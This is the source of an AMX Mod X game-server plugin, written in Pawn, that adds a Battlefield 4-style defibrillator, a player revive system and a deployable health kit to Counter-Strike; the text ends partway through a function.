#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <fun>
#include <engine>
#include <fakemeta>
#include <hamsandwich>
#include <xs>
#include <bf4natives>
#include <bf4const>
#include <bf4weapons>
#include <cswm>

//=====================================
//  VERSION CHECK
//=====================================
#if AMXX_VERSION_NUM < 190
	#assert "AMX Mod X v1.9.0 or Higher library required!"
#endif

#pragma compress 						1
#pragma semicolon 						1
#pragma tabsize 						4

static const PLUGIN_NAME	[] 			= "BF4 Weapons - Defibrillator";
static const PLUGIN_AUTHOR	[] 			= "Aoi.Kagase";
static const PLUGIN_VERSION	[]			= "0.1";

#if !defined MAX_PLAYERS
	#define  MAX_PLAYERS	          	32
#endif
#if !defined MAX_RESOURCE_PATH_LENGTH
	#define  MAX_RESOURCE_PATH_LENGTH 	64
#endif
#if !defined MAX_NAME_LENGTH
	#define  MAX_NAME_LENGTH			32
#endif

#define TASKID_DIE_COUNT				41320
#define TASKID_REVIVING					41360
#define TASKID_CHECK_DEAD_FLAG			41400
#define TASKID_RESPAWN 	            	41440
#define TASKID_CHECKRE 	            	41480
#define TASKID_CHECKST 	            	41520
#define TASKID_ORIGIN 	            	41560
#define TASKID_SETUSER 	            	41600
#define TASKID_SPAWN					41650
#define m_flNextSecondaryAttack			47
#define pev_zorigin						pev_fuser4
#define seconds(%1) 					((1<<12) * (%1))

#define HUDINFO_PARAMS

#define ITEM_OWNER 						pev_iuser1
#define ITEM_TEAM  						pev_iuser2
enum _:E_ICON_STATE
{
	ICON_HIDE = 0,
	ICON_SHOW,
	ICON_FLASH
};

enum _:E_SOUNDS
{
	SOUND_START,
	SOUND_FINISHED,
	SOUND_FAILED,
	SOUND_EQUIP,
};

enum _:E_MODELS
{
	R_KIT,
	V_WPN,
};

enum _:E_CVARS
{
	RKIT_HEALTH,
	RKIT_COST,
	RKIT_SC_FADE,
	RKIT_TIME,
	RKIT_SC_FADE_TIME,
	RKIT_DEATH_TIME,
	Float:RKIT_DISTANCE,
	HEALTHKIT_COST,
	HEALTHKIT_AMOUNT,
	Float:HEALTHKIT_INTERVAL,
};

enum _:E_PLAYER_DATA
{
	bool:WAS_DUCKING	,
	bool:IS_DEAD		,
	bool:IS_RESPAWNING	,
	Float:DEAD_LINE		,
	Float:REVIVE_DELAY	,
	Float:BODY_ORIGIN	[3],
};

enum _:E_CLASS_NAME
{
	I_TARGET,
	PLAYER,
	CORPSE,
	R_KIT,
	WPN_KNIFE,
};

enum _:E_MESSAGES
{
	MSG_BARTIME,
	MSG_SCREEN_FADE,
	MSG_STATUS_ICON,
	MSG_CLCORPSE,
	MSG_WEAPONLIST,
	MSG_SCREEN_SHAKE,
}

enum _:E_SEQUENCE
{
	SEQ_IDLE,
	SEQ_SLASH1,
	SEQ_SLASH2,
	SEQ_DRAW,
	SEQ_STAB,
	SEQ_STAB_MISS,
	SEQ_MID_SLASH1,
	SEQ_MID_SLASH2,
}

new const MESSAGES[E_MESSAGES][] = 
{
	"BarTime",
	"ScreenFade",
	"StatusIcon",
	"ClCorpse",
	"WeaponList",
	"ScreenShake",
};

new const ENT_MODELS[E_MODELS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"models/bf4_ranks/medkit.mdl",
	"models/bf4_ranks/weapons/v_defibrillator.mdl"
};

new const ENT_SOUNDS[E_SOUNDS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"items/medshot4.wav",
	"items/smallmedkit2.wav",
	"items/medshotno1.wav",
	"items/ammopickup2.wav",
};

new const ENTITY_CLASS_NAME[E_CLASS_NAME][MAX_NAME_LENGTH] = 
{
	"info_target",
	"player",
	"fake_corpse",
	"RKIT_kit",
	"weapon_knife",
};

new const ORIGINAL_KNIFE_SOUND[][] = 
{
	"weapons/knife_deploy1.wav",
	"weapons/knife_hit1.wav",
	"weapons/knife_hit2.wav",
	"weapons/knife_hit3.wav",
	"weapons/knife_hit4.wav",
	"weapons/knife_hitwall1.wav",
	"weapons/knife_slash1.wav",
	"weapons/knife_slash2.wav",
	"weapons/knife_stab.wav"
};

new const REPLACE_KNIFE_SOUND[][] = 
{ 
	"bf4_ranks/weapons/defibrillator_deploy1.wav",
	"bf4_ranks/weapons/defibrillator_hit1.wav",
	"bf4_ranks/weapons/defibrillator_hit2.wav",
	"bf4_ranks/weapons/defibrillator_hit3.wav",
	"bf4_ranks/weapons/defibrillator_hit4.wav",
	"bf4_ranks/weapons/defibrillator_hitwall1.wav",
	"bf4_ranks/weapons/defibrillator_slash1.wav",
	"bf4_ranks/weapons/defibrillator_slash2.wav",
	"bf4_ranks/weapons/defibrillator_stab.wav"
};
new const ENT_CLASS_BREAKABLE[] = "func_breakable";
new const ENT_CLASS_KIT[]		= "bf4_healthkit";

new g_cvars			[E_CVARS];
new g_msg_data		[E_MESSAGES];
new g_player_data	[MAX_PLAYERS + 1][E_PLAYER_DATA];
new g_sync_obj;
new gObjectItem		[MAX_PLAYERS + 1];
new gWpnSystemId;

//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	check_plugin();

	for (new i = 0; i < E_SOUNDS; i++)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < sizeof REPLACE_KNIFE_SOUND; i++)
		precache_sound(REPLACE_KNIFE_SOUND[i]);

	for (new i = 0; i < E_MODELS; i++) 
		precache_model(ENT_MODELS[i]);

	precache_generic("sprites/bf4_ranks/weapons/weapon_defibrillator.txt");
	precache_generic("sprites/bf4_ranks/weapons/weapon_defibrillator.spr");

	gWpnSystemId = BF4RegisterWeapon(BF4_TEAM_BOTH, 
		BF4_CLASS_REQUIRE | BF4_CLASS_ASSAULT, 
		BF4_WEAPONCLASS_MELEE, 
		-1,
		"Defibrillator",
		"knife",
		_:Ammo_None,
		""
	);

	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin		(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR);
	register_cvar		(PLUGIN_NAME, PLUGIN_VERSION, FCVAR_SPONLY|FCVAR_SERVER);

	bind_pcvar_num		(create_cvar("bf4_rkit_health", 			"75"), 		g_cvars[RKIT_HEALTH]);
	bind_pcvar_num		(create_cvar("bf4_rkit_cost", 				"1200"), 	g_cvars[RKIT_COST]);
	bind_pcvar_num		(create_cvar("bf4_rkit_screen_fade",		"1"), 		g_cvars[RKIT_SC_FADE]);
	bind_pcvar_num		(create_cvar("bf4_rkit_delay_revive", 		"0.2"),		g_cvars[RKIT_TIME]);
	bind_pcvar_num		(create_cvar("bf4_rkit_delay_die", 			"15"), 		g_cvars[RKIT_DEATH_TIME]);
	bind_pcvar_num		(create_cvar("bf4_rkit_screen_fade_time", 	"2"), 		g_cvars[RKIT_SC_FADE_TIME]);
	bind_pcvar_float	(create_cvar("bf4_rkit_distance", 			"70.0"), 	g_cvars[RKIT_DISTANCE]);

	bind_pcvar_num		(create_cvar("bf4_hkit_cost", 				"3000"),	g_cvars[HEALTHKIT_COST]);
	bind_pcvar_float	(create_cvar("bf4_hkit_interval",			"1.0"), 	g_cvars[HEALTHKIT_INTERVAL]);
	bind_pcvar_num		(create_cvar("bf4_hkit_amount", 			"30"), 		g_cvars[HEALTHKIT_AMOUNT]);

	RegisterHamPlayer	(Ham_Killed,								"PlayerKilled");
//	RegisterHamPlayer	(Ham_Player_PostThink,						"PlayerPostThink");
	RegisterHamPlayer	(Ham_Spawn, 								"PlayerSpawn", 	.Post = true);

//	register_event		("Damage", "OnDamage", "b", "2>0");

	register_message 	(g_msg_data[MSG_CLCORPSE],					"message_clcorpse");
	// Register Forward.
	register_forward	(FM_CmdStart,								"PlayerCmdStart");

/// =======================================================================================
/// START Custom Weapon Defibrillator
/// =======================================================================================
    register_clcmd		("bf4_ranks/weapons/weapon_defibrillator", 	"SelectDefibrillator");
    RegisterHam			(Ham_Item_AddToPlayer, 		ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnAddToPlayerKnife", 	.Post = true);
	RegisterHam			(Ham_Item_ItemSlot, 		ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnItemSlotKnife");
	RegisterHam			(Ham_Item_Deploy, 			ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnSetModels",			.Post = true);
	RegisterHam			(Ham_Weapon_PrimaryAttack, 	ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnPrimaryAttackPre");
	RegisterHam			(Ham_Weapon_PrimaryAttack, 	ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnPrimaryAttackPost",	.Post = true);
	RegisterHam			(Ham_Weapon_SecondaryAttack,ENTITY_CLASS_NAME[WPN_KNIFE], 	"OnSecondaryAttackPre");
	RegisterHamPlayer	(Ham_TakeDamage,			"OnTakeDamage");
	register_forward	(FM_EmitSound, 				"KnifeSound");
/// =======================================================================================
/// END Custom Weapon Defibrillator
/// =======================================================================================

/// =======================================================================================
/// START HealthKit
/// =======================================================================================
	RegisterHam			(Ham_Think, 				ENT_CLASS_BREAKABLE, 			"BF4ObjectThink");
/// =======================================================================================
/// END HealthKit
/// =======================================================================================

	for(new i = 0; i < E_MESSAGES; i++)
		g_msg_data[i] = get_user_msgid(MESSAGES[i]);

	g_sync_obj = CreateHudSyncObj();
}

/// =======================================================================================
/// START Custom Weapon Defibrillator
/// =======================================================================================
public OnAddToPlayerKnife(const item, const player)
{
    if(pev_valid(item) && is_user_alive(player)) 	// just for safety.
    {
		if (!BF4HaveThisWeapon(player, gWpnSystemId))
			return PLUGIN_CONTINUE;

        message_begin( MSG_ONE, g_msg_data[MSG_WEAPONLIST], .player = player );
        {
            write_string("bf4_ranks/weapons/weapon_defibrillator");   // WeaponName
            write_byte(-1);                   		// PrimaryAmmoID
            write_byte(-1);                   		// PrimaryAmmoMaxAmount
            write_byte(-1);                   		// SecondaryAmmoID
            write_byte(-1);                   		// SecondaryAmmoMaxAmount
            write_byte(4);                    		// SlotID (0...N)
            write_byte(1);                    		// NumberInSlot (1...N)
            write_byte(CSW_KNIFE);            		// WeaponID
            write_byte(0);                    		// Flags
        }
        message_end();
    }
	return PLUGIN_CONTINUE;
}

public SelectDefibrillator(const client) 
{ 
    engclient_cmd(client, "weapon_knife"); 
} 

public OnItemSlotKnife(const item)
{
    SetHamReturnInteger(5);
    return HAM_SUPERCEDE;
}

public OnSetModels(const item)
{
	if (pev_valid(item) != 2)
		return PLUGIN_CONTINUE;

	static client; client = get_pdata_cbase(item, 41, 4);
	if (!is_user_alive(client))
		return PLUGIN_CONTINUE;
	if (!BF4HaveThisWeapon(client, gWpnSystemId))
		return PLUGIN_CONTINUE;
	if (get_pdata_cbase(client, 373) != item)
		return PLUGIN_CONTINUE;

	set_pev(client, pev_viewmodel2, ENT_MODELS[V_WPN]);
	UTIL_PlayWeaponAnimation(client, SEQ_DRAW);

	return PLUGIN_HANDLED;
}

public KnifeSound(id, channel, sample[])
{
	if(is_user_connected(id) && is_user_alive(id))
	{
		if (!BF4HaveThisWeapon(id, gWpnSystemId))
			return FMRES_IGNORED;
		for(new i; i < sizeof REPLACE_KNIFE_SOUND; i++)
		{
			if(equal(sample, ORIGINAL_KNIFE_SOUND[i]))
			{
				emit_sound(id, CHAN_ITEM, REPLACE_KNIFE_SOUND[i], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				return FMRES_SUPERCEDE;
			}
		}
	}
	return FMRES_IGNORED;
}

public OnPrimaryAttackPre(Weapon)
{
	new client = get_pdata_cbase(Weapon, 41, 4);

	if (!BF4HaveThisWeapon(client, gWpnSystemId))
		return HAM_IGNORED;
	
	if(get_pdata_cbase(client, 373) != Weapon)
		return HAM_IGNORED;

	if (!CheckDeadBody(client))
		return HAM_HANDLED;

	wait_revive(client);
	UTIL_ScreenShake(client, 0.2, 0.2, 0.3);
	ExecuteHam(Ham_Player_Duck, client);
	return HAM_HANDLED;
}

public OnSecondaryAttackPre(Weapon)
{
	new client = get_pdata_cbase(Weapon, 41, 4);

	if (!BF4HaveThisWeapon(client, gWpnSystemId))
		return HAM_IGNORED;
	
	if(get_pdata_cbase(client, 373) != Weapon)
		return HAM_IGNORED;

	UTIL_PlayWeaponAnimation(client, SEQ_MID_SLASH1);
	BF4SpawnEntity(client);
	set_pdata_float(Weapon, m_flNextSecondaryAttack, 10.0);
	return HAM_SUPERCEDE;
}

public OnPrimaryAttackPost(Weapon)
{
	new client = get_pdata_cbase(Weapon, 41, 4);

	if (!BF4HaveThisWeapon(client, gWpnSystemId))
		return HAM_IGNORED;

	if(get_pdata_cbase(client, 373) != Weapon)
		return HAM_IGNORED;

	UTIL_PlayWeaponAnimation(client, SEQ_STAB);
	return HAM_IGNORED;
}

public OnTakeDamage(iVictim, inflictor, iAttacker, Float:damage, damage_type)
{
	// Assist Damage.
	if (is_user_connected(iAttacker) && is_user_connected(iVictim))
	{
		if (!BF4HaveThisWeapon(iAttacker, gWpnSystemId))
			return HAM_IGNORED;

//		if (GetBF4PlayerClass(attacker) == BF4_CLASS_ASSAULT)
		{
			if (get_user_weapon(iAttacker) != CSW_KNIFE)
				return HAM_IGNORED;
			if (cs_get_user_team(iAttacker) != cs_get_user_team(iVictim))
			{
				SetHamParamFloat(4, 200.0);
				return HAM_HANDLED;
			}
		}
	}
	return HAM_IGNORED;
}

stock UTIL_PlayWeaponAnimation(const Player, const Sequence)
{
	set_pev(Player, pev_weaponanim, Sequence);
	
	message_begin(MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, .player = Player);
	write_byte(Sequence);
	write_byte(pev(Player, pev_body));
	message_end();
}

stock UTIL_ScreenShake(id, Float:duration, Float:frequency, Float:amplitude)
{
    // Screen Shake
    message_begin(MSG_ONE, g_msg_data[MSG_SCREEN_SHAKE], {0,0,0}, id);
    write_short(FixedUnsigned16(amplitude,	1<<12 )); 	// shake amount
    write_short(FixedUnsigned16(duration, 	1<<12 ));	// shake lasts this long
    write_short(FixedUnsigned16(frequency,	1<<8 ));	// shake noise frequency
    message_end();
}


stock FixedUnsigned16(Float:value, scale)
{
    new output;

    output = floatround(value * scale);
    if (output < 0)
        output = 0;
    if (output > 0xFFFF)
        output = 0xFFFF;

    return output;
} 
/// =======================================================================================
/// END Custom Weapon Defibrillator
/// =======================================================================================

/// =======================================================================================
/// START Medikit for Ground
/// =======================================================================================
BF4SpawnEntity(id)
{
	if (pev_valid(gObjectItem[id]))
	{
		new flags;
		// engfunc(EngFunc_RemoveEntity, gObjectItem[id]);
		pev(gObjectItem[id], pev_flags, flags);
		set_pev(gObjectItem[id], pev_flags, flags | FL_KILLME);
		dllfunc(DLLFunc_Think, gObjectItem[id]);
	}

	new iEnt = cs_create_entity(ENT_CLASS_BREAKABLE);
	if (pev_valid(iEnt))
	{
		gObjectItem[id] = iEnt;
		// set models.
		engfunc(EngFunc_SetModel, iEnt, ENT_MODELS[R_KIT]);
		// set solid.
		set_pev(iEnt, pev_solid, 		SOLID_BBOX);
		// set movetype.
		set_pev(iEnt, pev_movetype, 	MOVETYPE_TOSS);

		set_pev(iEnt, pev_renderfx,	 	kRenderFxNone);
		set_pev(iEnt, pev_body, 		3);

		// set model animation.
		set_pev(iEnt, pev_frame,		0);
		set_pev(iEnt, pev_framerate,	0);
		// set_pev(iEnt, pev_renderamt,	255.0);
		// set_pev(iEnt, pev_rendercolor,	{255.0,255.0,255.0});
		set_pev(iEnt, pev_owner,		id);
		// Entity Setting.
		// set class name.
		set_pev(iEnt, pev_classname, 	ENT_CLASS_KIT);
		// set take damage.
		set_pev(iEnt, pev_takedamage, 	DAMAGE_YES);
		set_pev(iEnt, pev_dmg, 			100.0);
		// set entity health.
		set_pev(iEnt, pev_health,		50.0);
		// Vector settings.
		new Float:vOrigin	[3],
			Float:vViewOfs	[3],
			Float:vVelocity	[3];

		// get user position.
		pev(id, pev_origin, vOrigin);
		pev(id, pev_view_ofs, vViewOfs);

		velocity_by_aim(id, 100, vVelocity);
		xs_vec_add(vOrigin, vViewOfs, vOrigin);  	

		// set size.
		engfunc(EngFunc_SetSize, iEnt, Float:{ -4.0, -4.0, -4.0 }, Float:{ 4.0, 4.0, 4.0 } );
		// set entity position.
		engfunc(EngFunc_SetOrigin, iEnt, vOrigin );
		set_pev(iEnt, pev_velocity,		vVelocity);

		set_pev(iEnt, pev_renderfx, 	kRenderFxGlowShell);
		if (is_user_connected(id))
			if (cs_get_user_team(id) == CS_TEAM_CT)
				set_pev(iEnt, pev_rendercolor, 	Float:{0.0, 0.0, 255.0});
			else if(cs_get_user_team(id) == CS_TEAM_T)
				set_pev(iEnt, pev_rendercolor, 	Float:{255.0, 0.0, 0.0});
		set_pev(iEnt, pev_rendermode, 	kRenderNormal);
		set_pev(iEnt, pev_renderamt, 	5.0);

		// Reset powoer on delay time.
		new Float:fCurrTime = get_gametime();

		// Save results to be used later.
		set_pev(iEnt, ITEM_TEAM,	cs_get_user_team(id));
		// think rate. hmmm....
		set_pev(iEnt, pev_nextthink,fCurrTime + 2.0);

		emit_sound(id, CHAN_ITEM, "items/ammopickup2.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
}

public BF4ObjectThink(iEnt)
{
	if (!pev_valid(iEnt))
		return HAM_IGNORED;

	new CsTeams:team = CsTeams:pev(iEnt, ITEM_TEAM);
	new Float:vOrigin[3];
	new Float:fCurrTime = get_gametime();
	new entity, health;
	new Float:radius = 128.0;
	new classname[32];
	new owner = pev(iEnt, pev_owner);
	pev(iEnt, pev_origin, vOrigin);
	pev(iEnt, pev_classname, classname, charsmax(classname));

	if (equali(ENT_CLASS_KIT, classname))
	{
		entity = -1;
		while((entity = engfunc(EngFunc_FindEntityInSphere, entity, vOrigin, radius)) != 0)
		{
			if (is_user_alive(entity))
			{
				if (cs_get_user_team(entity) == team)
				{
					health = get_user_health(entity);
					if (health < 100)
					{
						set_user_health(entity, min(health + g_cvars[HEALTHKIT_AMOUNT], 100));
						emit_sound(entity, CHAN_ITEM, "items/medshot4.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);

						if (owner != entity)
						{
							BF4TriggerGetRibbon(owner, BF4_RNK_MEDIKIT, "Mate Healing.");
						}
					}
				}
			}
		}
		set_pev(iEnt, pev_nextthink, fCurrTime + g_cvars[HEALTHKIT_INTERVAL]);
	}
	return HAM_IGNORED;
}
/// =======================================================================================
/// END Medikit for Ground
/// =======================================================================================

public client_putinserver(id)
{
	player_reset(id);
}

public client_disconnected(id)
{
	player_reset(id);
	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
}

public PlayerKilled(iVictim, iAttacker)
{
	player_reset(iVictim);

	static Float:minsize[3];
	pev(iVictim, pev_mins, minsize);

	if(minsize[2] == -18.0)
		g_player_data[iVictim][WAS_DUCKING] = true;
	else
		g_player_data[iVictim][WAS_DUCKING] = false;
		
	g_player_data[iVictim][DEAD_LINE] = get_gametime();

	if (g_cvars[RKIT_DEATH_TIME] > 0)
		set_task_ex(1.0, "PlayerDie", 	  TASKID_DIE_COUNT 		 + iVictim, _, _, SetTaskFlags:SetTask_Repeat);
	set_task_ex(0.5, "TaskCheckDeadFlag", TASKID_CHECK_DEAD_FLAG + iVictim, _, _, SetTaskFlags:SetTask_Repeat);

	return HAM_IGNORED;
}

#define GUAGE_MAX 30
public PlayerDie(taskid)
{
	new id = taskid - TASKID_DIE_COUNT;
	new Float:time = (get_gametime() - g_player_data[id][DEAD_LINE]);
	new Float:remaining = 0.0;
	new bar[31] = "";

	if (!is_user_connected(id))
	{
		player_reset(id);
		return PLUGIN_CONTINUE;
	}

	if (!is_user_alive(id))
	{
		if (time < g_cvars[RKIT_DEATH_TIME])
		{
			if (!is_user_bot(id))
			{
				remaining = g_cvars[RKIT_DEATH_TIME] - time;
				show_time_bar(100 / GUAGE_MAX, floatround(remaining * 100.0 / float(g_cvars[RKIT_DEATH_TIME]), floatround_ceil), bar);
				new timestr[6];
				get_time_format(remaining, timestr, charsmax(timestr));
				set_hudmessage(255, 0, 0, -1.00, -1.00, .effects= 0 , .fxtime = 0.0, .holdtime = 1.0, .fadeintime = 0.0, .fadeouttime = 0.0, .channel = -1);
				ShowSyncHudMsg(id, g_sync_obj, "Remaining revivable time: ^n%s^n[%s]", timestr, bar);
			}
		}
		else
		{
//			if (is_bf4_deathmatch())
				ExecuteHamB(Ham_CS_RoundRespawn, id);
//			else
				remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
		}
	}
	else
	{
		remove_task(taskid);
	}
	return PLUGIN_CONTINUE;
}

public PlayerSpawn(id)
{
	if (g_player_data[id][IS_RESPAWNING])
		set_task(0.1, "TaskOrigin",  TASKID_ORIGIN + id);
	else 
		player_respawn_reset(id);		

	g_player_data[id][IS_RESPAWNING] = false;

	set_task_ex(0.1, "TaskSpawn", TASKID_SPAWN + id);
}

public TaskSpawn(taskid)
{
	new id = taskid - TASKID_SPAWN;
	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[R_KIT]);

	if (pev_valid(gObjectItem[id]))
	{
		new flags;
		pev(gObjectItem[id], pev_flags, flags);
		set_pev(gObjectItem[id], pev_flags, flags | FL_KILLME);
		dllfunc(DLLFunc_Think, gObjectItem[id]);
		gObjectItem[id] = 0;
	}	
}

stock show_time_bar(oneper, percent, bar[])
{
	for(new i = 0; i < 30; i++)
		bar[i] = ((i * oneper) < percent) ? '|' : '_';
	bar[30] = '^0';
}

public message_clcorpse()
{
	return PLUGIN_HANDLED;
}

/*
public PlayerCmdStart(id, handle, random_seed)
{
	// Not alive
	if(!is_user_alive(id))
		return FMRES_IGNORED;

	// Get user old and actual buttons
	static iInButton, iInOldButton;
	iInButton	 = (get_uc(handle, UC_Buttons));
	iInOldButton = (get_user_oldbutton(id)) & IN_USE;

	// C4 is through.
	if ((pev(id, pev_weapons) & (1 << CSW_C4)) && (iInButton & IN_ATTACK))
		return FMRES_IGNORED;

	return FMRES_IGNORED;
}
*/

//====================================================
// Revive Progress.
//====================================================
public wait_revive(id)
{
	if (g_cvars[RKIT_TIME] > 0.0)
		show_progress(id, g_cvars[RKIT_TIME]);
	
	new Float:gametime = get_gametime();
	g_player_data[id][REVIVE_DELAY] = (gametime + g_cvars[RKIT_TIME] - 0.01);

//	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_START], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	set_task_ex(0.1, "TaskRevive", TASKID_REVIVING + id, _,_, SetTaskFlags:SetTask_Repeat);

	return FMRES_HANDLED;
}

stock CheckDeadBody(id)
{
	// Removing Check.
	new body = find_dead_body(id);
	if(!pev_valid(body))
		return false;

	new lucky_bastard 		= pev(body, pev_owner);
	new CsTeams:lb_team 	= cs_get_user_team(lucky_bastard);
	new CsTeams:rev_team 	= cs_get_user_team(id);
	if(lb_team != CS_TEAM_T && lb_team != CS_TEAM_CT || lb_team != rev_team)
		return false;

//	client_print(id, print_chat, "Reviving %n", lucky_bastard);
	return true;
}

public TaskCheckDeadFlag(taskid)
{
	new id = taskid - TASKID_CHECK_DEAD_FLAG;
	if(!is_user_connected(id))
		return;
	
	if(pev(id, pev_deadflag) == DEAD_DEAD)
	{
		create_fake_corpse(id);
		remove_task(taskid);
	}
}	

public TaskRevive(taskid)
{
	new id = taskid - TASKID_REVIVING;
	new target, body;

	if (!can_target_revive(id, target, body))
	{
		failed_revive(id);
		remove_task(taskid);
		return PLUGIN_CONTINUE;
	}

	static Float:velocity[3];
	pev(id, pev_velocity, velocity);
	xs_vec_set(velocity, 0.0, 0.0, velocity[2]);
	set_pev(id, pev_velocity, velocity);		

	if(g_player_data[id][REVIVE_DELAY] < get_gametime())
	{
		if(findemptyloc(body, 10.0))
		{
			BF4TriggerGetRibbon(id, BF4_RNK_REVIVE, "Defibrillator Point.");
			set_pev(body, pev_flags, pev(body, pev_flags) | FL_KILLME);			
//			emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FINISHED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + target);
			remove_task(taskid);
		}
	}
	return PLUGIN_CONTINUE;
}

 public TaskReSpawn(taskid) 
 {
	new id = taskid - TASKID_RESPAWN;
	
	// set_pev(id, pev_deadflag, DEAD_RESPAWNABLE);
	// dllfunc(DLLFunc_Spawn, id);
	// set_pev(id, pev_iuser1, 0);
	g_player_data[id][IS_RESPAWNING] = true;
	ExecuteHamB(Ham_CS_RoundRespawn, id);
	// set_task(0.1, "TaskCheckReSpawn", TASKID_CHECKRE + id);
}

public TaskCheckReSpawn(taskid)
{
	new id = taskid - TASKID_CHECKRE;
	
	if(pev(id, pev_iuser1))
		set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskOrigin",  TASKID_ORIGIN + id);
}

public TaskOrigin(taskid)
{
	new id = taskid - TASKID_ORIGIN;
	engfunc(EngFunc_SetOrigin, id, g_player_data[id][BODY_ORIGIN]);
	
	static  Float:origin[3];
	pev(id, pev_origin, origin);
	set_pev(id, pev_zorigin, origin[2]);
		
	set_task(0.1, "TaskStuckCheck", TASKID_CHECKST + id);
}

public TaskStuckCheck(taskid)
{
	new id = taskid - TASKID_CHECKST;

	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	if(origin[2] == pev(id, pev_zorigin))
		set_task(0.1, "TaskCheckReSpawn",   TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskSetplayer", 		TASKID_SETUSER + id);
}

public TaskSetplayer(taskid)
{
	new id = taskid - TASKID_SETUSER;
	
	new entity = -1;
	new Float:vOrigin[3];
	new Float:radius = 128.0;
	pev(id, pev_origin, vOrigin);

	set_user_health(id, g_cvars[RKIT_HEALTH]);

	if (!is_user_bot(id))
	if (g_cvars[RKIT_SC_FADE])
	{
		new sec = seconds(g_cvars[RKIT_SC_FADE_TIME]);
		message_begin(MSG_ONE,g_msg_data[MSG_SCREEN_FADE], _, id);
		write_short(sec);
		write_short(sec);
		write_short(0);
		write_byte(0);
		write_byte(0);
		write_byte(0);
		write_byte(255);
		message_end();
	}
	g_player_data[id][IS_RESPAWNING] = false;

	// strip_user_weapons(id);
	// give_item(id, "weapon_knife");
	while((entity = engfunc(EngFunc_FindEntityInSphere, entity, vOrigin, radius)) != 0)
	{
		if (pev_valid(entity))
		{
			if(pev(entity, pev_owner) == id)
			{
				dllfunc(DLLFunc_Touch, entity, id);
			}
		}
	}

	player_respawn_reset(id);
}

stock bool:can_target_revive(id, &target, &body)
{
	if(!is_user_alive(id))
		return false;
	
	body = find_dead_body(id);
	if(!pev_valid(body))
		return false;
	
	target = pev(body, pev_owner);
	if(!is_user_connected(target))
		return false;

	new lb_team  = get_user_team(target);
	new rev_team = get_user_team(id);
	if(lb_team != 1 && lb_team != 2 || lb_team != rev_team)
		return false;

	return true;
}

stock failed_revive(id)
{
	show_progress(id, 0);
	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FAILED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
}

stock find_dead_body(id)
{
	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	new ent;
	static classname[32];

	while((ent = engfunc(EngFunc_FindEntityInSphere, ent, origin, g_cvars[RKIT_DISTANCE])) != 0)
	{
		pev(ent, pev_classname, classname, 31);
		if(equali(classname, ENTITY_CLASS_NAME[CORPSE]) && is_ent_visible(id, ent, IGNORE_MONSTERS))
			return ent;
	}
	return 0;
}

stock bool:is_ent_visible(index, entity, ignoremonsters = 0) 
{
	new Float:start[3], Float:dest[3];
	pev(index, pev_origin, start);
	pev(index, pev_view_ofs, dest);
	xs_vec_add(start, dest, start);

	pev(entity, pev_origin, dest);
	engfunc(EngFunc_TraceLine, start, dest, ignoremonsters, index, 0);

	new Float:fraction;
	get_tr2(0, TR_flFraction, fraction);
	if (fraction == 1.0 || get_tr2(0, TR_pHit) == entity)
		return true;

	return false;
}

stock create_fake_corpse(id)
{
	set_pev(id, pev_effects, EF_NODRAW);
	
	static model[32];
	cs_get_user_model(id, model, 31);
		
	static player_model[64];
	formatex(player_model, 63, "models/player/%s/%s.mdl", model, model);
			
	static Float: player_origin[3];
	pev(id, pev_origin, player_origin);
		
	static Float:mins[3];
	xs_vec_set(mins, -16.0, -16.0, -34.0);
	
	static Float:maxs[3];
	xs_vec_set(maxs, 16.0, 16.0, 34.0);
	
	if(g_player_data[id][WAS_DUCKING])
	{
		mins[2] /= 2;
		maxs[2] /= 2;
	}
		
	static Float:player_angles[3];
	pev(id, pev_angles, player_angles);
	player_angles[2] = 0.0;
				
	new sequence = pev(id, pev_sequence);
	
//	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	new ent = cs_create_entity(ENTITY_CLASS_NAME[I_TARGET]);
	if(pev_valid(ent))
	{
		cs_set_ent_class(ent, ENTITY_CLASS_NAME[CORPSE]);
		set_pev(ent, pev_classname, ENTITY_CLASS_NAME[CORPSE]);
		engfunc(EngFunc_SetModel, 	ent, player_model);
		engfunc(EngFunc_SetOrigin, 	ent, player_origin);
		engfunc(EngFunc_SetSize, 	ent, mins, maxs);
		set_pev(ent, pev_solid, 	SOLID_TRIGGER);
		set_pev(ent, pev_movetype, 	MOVETYPE_TOSS);
		set_pev(ent, pev_owner, 	id);
		set_pev(ent, pev_angles, 	player_angles);
		set_pev(ent, pev_sequence, 	sequence);
		set_pev(ent, pev_frame, 	9999.9);
		set_pev(ent, pev_flags, pev(ent, pev_flags) | FL_MONSTER);
	}	
}

stock bool:findemptyloc(ent, Float:radius)
{
	if(!pev_valid(ent))
		return false;

	static Float:origin[3];
	pev(ent, pev_origin, origin);
